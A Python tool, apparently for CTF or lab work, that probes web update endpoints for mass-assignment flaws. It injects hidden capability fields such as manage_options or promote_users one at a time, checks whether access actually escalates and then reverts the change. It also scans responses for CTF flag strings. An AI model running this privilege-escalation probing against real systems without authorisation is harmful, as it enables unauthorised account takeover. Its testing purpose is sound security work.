#!/usr/bin/env python3
"""Bounded hidden-field and nested-capability mass-assignment detector.

Start from a known-valid update request.  Mutate exactly one explicit candidate,
then compare authoritative readback, rendered links/forms, and gated routes.  A
stored field is retained as a lead; only a new capability surface or an access
transition is reported as effective privilege change.

Cleanup is mandatory unless ``--disposable`` is used with exactly one candidate.
Exit codes: 0 effective change or flag, 2 no effective change/inconclusive,
3 request/rate/gateway/cleanup circuit breaker, 4 invalid arguments.
"""
import argparse
import copy
import hashlib
import json
import os
import re
import sys
import time
from html.parser import HTMLParser
from urllib.parse import parse_qsl

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
GATEWAY_FAILURES = {502, 503, 504}
DENIAL_RE = re.compile(
    r"unauthori[sz]ed|forbidden|access denied|permission denied|not allowed|"
    r"insufficient (?:role|permission|privilege)|admin(?:istrator)? (?:access )?required",
    re.I)
FLAG_RE = re.compile(
    r"(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)"
    r"\{[^}]{3,120}\}", re.I)
SENSITIVE_KEY_RE = re.compile(
    r"pass|secret|token|cookie|authorization|api[_-]?key|nonce", re.I)

PROFILES = {
    # Opt-in and intentionally bounded. These are independently tested map keys,
    # not a universal property spray and not a claim about genuine WordPress.
    "wordpress-capabilities": (
        "moderate_comments", "list_users", "manage_options", "activate_plugins",
        "install_plugins", "edit_themes", "edit_users", "promote_users",
    ),
}


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def redact(value):
    if isinstance(value, dict):
        return {key: "<redacted>" if SENSITIVE_KEY_RE.search(str(key)) else redact(item)
                for key, item in value.items()}
    if isinstance(value, tuple) and len(value) == 2:
        key, item = value
        return [key, "<redacted>" if SENSITIVE_KEY_RE.search(str(key)) else redact(item)]
    if isinstance(value, list):
        return [redact(item) for item in value]
    if isinstance(value, str) and len(value) > 120:
        return value[:40] + "<redacted-long-value>"
    return value


def scalar(value):
    try:
        parsed = json.loads(value)
    except (TypeError, ValueError):
        return value
    return parsed if isinstance(parsed, (str, int, float, bool)) or parsed is None else value


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def parse_candidate(raw, default):
    if "=" in raw:
        name, value = raw.split("=", 1)
    else:
        name, value = raw, default
    name = name.strip()
    if not name or any(ch in name for ch in "[]/\\"):
        raise ValueError("candidate names must be single map keys: %r" % raw)
    return name, scalar(value)


def pointer_parts(pointer):
    if pointer in ("", "/"):
        return []
    if not pointer.startswith("/"):
        raise ValueError("JSON --path must be a pointer such as /meta/capabilities")
    return [part.replace("~1", "/").replace("~0", "~")
            for part in pointer[1:].split("/")]


def form_parts(path):
    match = re.fullmatch(r"([^\[\]]+)((?:\[[^\[\]]+\])*)", path or "")
    if not match:
        raise ValueError("form --path must look like meta[capabilities] or options")
    return [match.group(1)] + re.findall(r"\[([^\[\]]+)\]", match.group(2))


def form_key(path, candidate):
    return path + "[" + candidate + "]"


def nested_json(baseline, path, candidate, value):
    result = copy.deepcopy(baseline)
    current = result
    for part in pointer_parts(path):
        if part not in current:
            current[part] = {}
        if not isinstance(current[part], dict):
            raise ValueError("JSON --path crosses non-object member %r" % part)
        current = current[part]
    current[candidate] = value
    return result


def nested_form(baseline, path, candidate, value):
    key = form_key(path, candidate)
    pairs = [(name, item) for name, item in baseline if name != key]
    pairs.append((key, json.dumps(value) if isinstance(value, bool) else "" if value is None
                  else str(value)))
    return pairs


def nested_lookup(value, parts):
    current = value
    for part in parts:
        if not isinstance(current, dict) or part not in current:
            return False, None
        current = current[part]
    return True, current


def normal(value):
    if isinstance(value, str):
        return value.strip().lower()
    return value


def values_match(actual, expected):
    if actual == expected:
        return True
    pairs = {
        ("true", True), ("1", True), (1, True),
        ("false", False), ("0", False), (0, False),
    }
    return (normal(actual), expected) in pairs or (actual, normal(expected)) in pairs


class SurfaceParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.items = set()

    def handle_starttag(self, tag, attrs):
        values = dict(attrs)
        if tag in ("a", "link") and values.get("href"):
            self.items.add("href=" + values["href"])
        if tag == "form":
            self.items.add("form=%s %s" % (
                values.get("method", "GET").upper(), values.get("action", "")))
        if tag in ("input", "select", "textarea", "button") and values.get("name"):
            self.items.add("field=" + values["name"])


def surface_items(response):
    parser = SurfaceParser()
    try:
        parser.feed(response.text or "")
    except (ValueError, AssertionError):
        return set()
    return parser.items


def denied(response):
    return response.status_code in (401, 403) or bool(DENIAL_RE.search(response.text or ""))


def route_fingerprint(response):
    body = response.content or b""
    return {
        "status": response.status_code,
        "content_type": response.headers.get("Content-Type", "").split(";", 1)[0].lower(),
        "length": len(body),
        "sha256": hashlib.sha256(body).hexdigest(),
        "denied": denied(response),
        "surface_items": surface_items(response),
    }


class MassAssignmentFastTrack:
    def __init__(self, args, baseline, candidates):
        self.args = args
        self.baseline = baseline
        self.candidates = candidates
        self.session = requests.Session()
        self.headers = {"User-Agent": UA, "Accept": "*/*"}
        if args.encoding == "json":
            self.headers["Content-Type"] = "application/json"
        else:
            self.headers["Content-Type"] = "application/x-www-form-urlencoded"
        if args.token:
            self.headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.headers["Cookie"] = args.cookie
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            self.headers[key.strip()] = value.strip()
        self.count = 0
        self.flags = []
        self.stored = []
        self.effective = []
        self.cleanup_verified = True
        os.makedirs(args.out, exist_ok=True)
        self.responses_dir = os.path.join(args.out, "responses")
        os.makedirs(self.responses_dir, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")
        self.summary_path = os.path.join(args.out, "summary.json")

    def _record(self, label, method, url, body, response):
        safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", label).strip("_") or "probe"
        record = {"label": label, "method": method, "url": url,
                  "request_body": redact(body)}
        if isinstance(response, Exception):
            record["error"] = repr(response)
        else:
            record.update({"status": response.status_code,
                           "headers": dict(response.headers),
                           "body": (response.text or "")[:12000]})
            path = os.path.join(self.responses_dir, "%03d-%s.txt" % (self.count, safe))
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("HTTP %d\n" % response.status_code)
                for key, value in response.headers.items():
                    fh.write("%s: %s\n" % (key, value))
                fh.write("\n" + (response.text or ""))
            record["response_file"] = os.path.relpath(path, self.args.out)
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def _scan_flag(self, response):
        text = (response.text or "") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        for hit in FLAG_RE.findall(text):
            if hit not in self.flags:
                self.flags.append(hit)
                print("FLAG %s" % hit)

    def send(self, label, method, url, body=None, safety=False):
        if not safety and self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        kwargs = {"method": method, "url": url, "headers": self.headers,
                  "timeout": self.args.timeout, "allow_redirects": False, "verify": False}
        if body is not None and method not in ("GET", "HEAD", "OPTIONS"):
            if self.args.encoding == "json":
                kwargs["json"] = body
            else:
                kwargs["data"] = body
        try:
            response = self.session.request(**kwargs)
        except requests.RequestException as exc:
            self._record(label, method, url, body, exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, method, url, body, response)
        budget = "%02d" % self.args.max_probes if self.count <= self.args.max_probes else "cleanup"
        print("[%02d/%s] %-38s HTTP %d %db" % (
            self.count, budget, label, response.status_code, len(response.content)))
        self._scan_flag(response)
        if response.status_code == 429:
            raise CircuitBreak("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response

    def observations(self, phase, safety=False):
        result = {"readback": {}, "surface": {}, "oracle": {}}
        for url in self.args.readback:
            response = self.send(phase + ":readback", "GET", url, safety=safety)
            try:
                result["readback"][url] = response.json()
            except ValueError:
                result["readback"][url] = None
        for url in self.args.surface:
            response = self.send(phase + ":surface", "GET", url, safety=safety)
            result["surface"][url] = surface_items(response)
        for url in self.args.oracle:
            response = self.send(phase + ":oracle", "GET", url, safety=safety)
            result["oracle"][url] = route_fingerprint(response)
        return result

    def body_for(self, candidate, value):
        if self.args.encoding == "json":
            return nested_json(self.baseline, self.args.path, candidate, value)
        return nested_form(self.baseline, self.args.path, candidate, value)

    def candidate_readback_paths(self, candidate):
        base = pointer_parts(self.args.path) if self.args.encoding == "json" \
            else form_parts(self.args.path)
        return base + [candidate]

    def compare(self, baseline, changed, candidate, wanted):
        stored = []
        effective = []
        lookup = self.candidate_readback_paths(candidate)
        for url, before in baseline["readback"].items():
            after = changed["readback"].get(url)
            if isinstance(after, dict):
                present, actual = nested_lookup(after, lookup)
                if present and values_match(actual, wanted):
                    stored.append("%s stores %s=%r" % (url, candidate, actual))
            if isinstance(before, dict) and isinstance(after, dict) and before != after:
                print("[+] structured readback changed at %s" % url)
        for url, before in baseline["surface"].items():
            added = sorted(changed["surface"].get(url, set()) - before)
            if added:
                effective.append("%s added %s" % (url, ", ".join(added)))
        for url, before in baseline["oracle"].items():
            after = changed["oracle"].get(url)
            access_opened = (after and (
                (before["denied"] and not after["denied"])
                or (before["status"] in (404, 405) and after["status"] < 400)))
            if access_opened:
                detail = "%s changed denied=%s HTTP %s to denied=%s HTTP %s" % (
                    url, before["denied"], before["status"],
                    after["denied"], after["status"])
                exposed = sorted(after["surface_items"] - before["surface_items"])
                if exposed:
                    detail += "; exposed " + ", ".join(exposed)
                effective.append(detail)
        return stored, effective

    def verify_cleanup(self, baseline, cleaned, candidate, cleanup_value):
        reasons = []
        for url, before in baseline["surface"].items():
            if cleaned["surface"].get(url) != before:
                reasons.append("surface did not revert: %s" % url)
        for url, before in baseline["oracle"].items():
            after = cleaned["oracle"].get(url)
            if not after or after["denied"] != before["denied"] or after["status"] != before["status"]:
                reasons.append("oracle did not revert: %s" % url)
        lookup = self.candidate_readback_paths(candidate)
        for url, after in cleaned["readback"].items():
            if isinstance(after, dict):
                present, actual = nested_lookup(after, lookup)
                if present and not values_match(actual, cleanup_value):
                    reasons.append("readback cleanup value mismatch: %s" % url)
        if reasons:
            self.cleanup_verified = False
            raise CircuitBreak("CLEANUP UNVERIFIED for %s: %s; stop or reset the account" %
                               (candidate, "; ".join(reasons)))

    def run(self):
        baseline_update = self.send("baseline:update", self.args.method, self.args.url,
                                    self.baseline)
        if not 200 <= baseline_update.status_code < 400:
            raise Inconclusive(
                "known-valid baseline did not succeed (HTTP %d); fix --baseline before probing" %
                baseline_update.status_code)
        baseline_obs = self.observations("baseline")
        if not any((self.args.readback, self.args.surface, self.args.oracle)):
            raise ValueError("supply at least one --readback, --surface, or --oracle")

        for candidate, wanted in self.candidates:
            attack_attempted = False
            candidate_error = None
            cleanup_error = None
            stored = effective = []
            try:
                attack_attempted = True
                response = self.send("%s:mutate" % candidate, self.args.method, self.args.url,
                                     self.body_for(candidate, wanted))
                if not 200 <= response.status_code < 400:
                    print("[-] %s rejected by update endpoint (HTTP %d)" %
                          (candidate, response.status_code))
                else:
                    changed = self.observations(candidate + ":changed")
                    stored, effective = self.compare(baseline_obs, changed, candidate, wanted)
            except (CircuitBreak, BudgetExhausted, KeyboardInterrupt) as exc:
                candidate_error = exc
            finally:
                if attack_attempted and not self.args.disposable:
                    try:
                        cleanup = self.send("%s:cleanup" % candidate, self.args.method,
                                            self.args.url,
                                            self.body_for(candidate, self.args.cleanup_value),
                                            safety=True)
                        if not 200 <= cleanup.status_code < 400:
                            raise CircuitBreak("cleanup update returned HTTP %d" %
                                               cleanup.status_code)
                        cleaned = self.observations(candidate + ":recheck", safety=True)
                        self.verify_cleanup(
                            baseline_obs, cleaned, candidate, self.args.cleanup_value)
                    except (CircuitBreak, KeyboardInterrupt) as exc:
                        self.cleanup_verified = False
                        cleanup_error = CircuitBreak(
                            "CLEANUP UNVERIFIED for %s: %s; stop or reset the account" %
                            (candidate, exc))
            if cleanup_error:
                raise cleanup_error
            if candidate_error:
                raise candidate_error
            if stored:
                self.stored.append({"candidate": candidate, "evidence": stored})
                print("[+] STORED nested candidate %s while identity labels may remain unchanged" %
                      candidate)
                for item in stored:
                    print("    " + item)
            if effective:
                self.effective.append({"candidate": candidate, "evidence": effective})
                print("[+] EFFECTIVE privilege transition for %s" % candidate)
                for item in effective:
                    print("    " + item)
            elif stored:
                print("[!] stored-only lead for %s; combine only evidence-backed capabilities "
                      "or follow newly exposed forms" % candidate)
            else:
                print("[-] no stored or effective differential for %s" % candidate)
            if self.flags:
                return

        if not self.effective:
            detail = "no effective privilege transition"
            if self.stored:
                detail += "; stored-only candidates remain leads"
            raise Inconclusive(detail)

    def write_summary(self, outcome, detail=None):
        summary = {
            "outcome": outcome, "detail": detail, "stored": self.stored,
            "effective": self.effective, "cleanup_verified": self.cleanup_verified,
            "flags": self.flags, "probes": self.count, "max_probes": self.args.max_probes,
            "candidates": [name for name, _ in self.candidates],
        }
        with open(self.summary_path, "w", encoding="utf-8") as fh:
            json.dump(summary, fh, indent=2, sort_keys=True)
            fh.write("\n")


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Test one hidden/nested property at a time and verify state transitions")
    parser.add_argument("--url", required=True, help="known-valid profile/update endpoint")
    parser.add_argument("--method", choices=("POST", "PUT", "PATCH"), default="POST")
    parser.add_argument("--encoding", choices=("form", "json"), default="form")
    baseline = parser.add_mutually_exclusive_group(required=True)
    baseline.add_argument("--baseline", help="valid form query string or JSON object")
    baseline.add_argument("--baseline-file", help="file containing the valid request body")
    parser.add_argument("--path", required=True,
                        help="form root (meta[capabilities]) or JSON pointer (/meta/capabilities)")
    parser.add_argument("--candidate", action="append", default=[],
                        help="single map key or key=value override; repeatable")
    parser.add_argument("--profile", action="append", choices=tuple(PROFILES), default=[],
                        help="explicit bounded candidate profile; repeatable")
    parser.add_argument("--value", default="true", help="default candidate value")
    cleanup = parser.add_mutually_exclusive_group(required=True)
    cleanup.add_argument("--cleanup-value",
                         help="neutral value written after every candidate, such as false")
    cleanup.add_argument("--disposable", action="store_true",
                         help="one-candidate disposable account; do not attempt cleanup")
    parser.add_argument("--readback", action="append", default=[],
                        help="GET JSON URL exposing authoritative stored state; repeatable")
    parser.add_argument("--surface", action="append", default=[],
                        help="GET HTML URL whose links/forms reveal capabilities; repeatable")
    parser.add_argument("--oracle", action="append", default=[],
                        help="GET gated route expected to be denied initially; repeatable")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[], help="extra 'Name: Value' header")
    parser.add_argument("--out", default="recon/massassignquick", help="evidence directory")
    parser.add_argument("--max-probes", type=int, default=80)
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--timeout", type=float, default=10.0)
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    runner = None
    try:
        raw = open(args.baseline_file, encoding="utf-8").read() \
            if args.baseline_file else args.baseline
        if args.encoding == "json":
            baseline = json.loads(raw)
            if not isinstance(baseline, dict):
                raise ValueError("JSON baseline must decode to an object")
            pointer_parts(args.path)
        else:
            baseline = parse_qsl(raw, keep_blank_values=True)
            if not baseline:
                raise ValueError("form baseline must contain at least one name=value pair")
            form_parts(args.path)
        if args.max_probes < 1 or args.delay < 0 or args.timeout <= 0:
            raise ValueError("probe budget/timeout must be positive and delay nonnegative")
        names = list(args.candidate)
        for profile in args.profile:
            names.extend(PROFILES[profile])
        names = unique(names)
        if not names:
            raise ValueError("supply --candidate or an explicit --profile")
        if args.disposable and len(names) != 1:
            raise ValueError("--disposable requires exactly one candidate per run")
        default = scalar(args.value)
        candidates = [parse_candidate(item, default) for item in names]
        args.cleanup_value = scalar(args.cleanup_value) if args.cleanup_value is not None else None
        runner = MassAssignmentFastTrack(args, baseline, candidates)
        runner.run()
        runner.write_summary("confirmed" if runner.effective else "flag")
        print("[*] completed %d probe(s); evidence: %s" % (runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        if runner:
            runner.write_summary("inconclusive", str(exc))
        print("[!] INCONCLUSIVE: %s" % exc)
        return 2
    except (CircuitBreak, KeyboardInterrupt) as exc:
        if runner:
            runner.write_summary("circuit-breaker", str(exc))
        print("[!] CIRCUIT BREAKER: %s" % exc)
        return 3
    except (OSError, ValueError, TypeError, json.JSONDecodeError) as exc:
        if runner:
            runner.write_summary("invalid-arguments", str(exc))
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
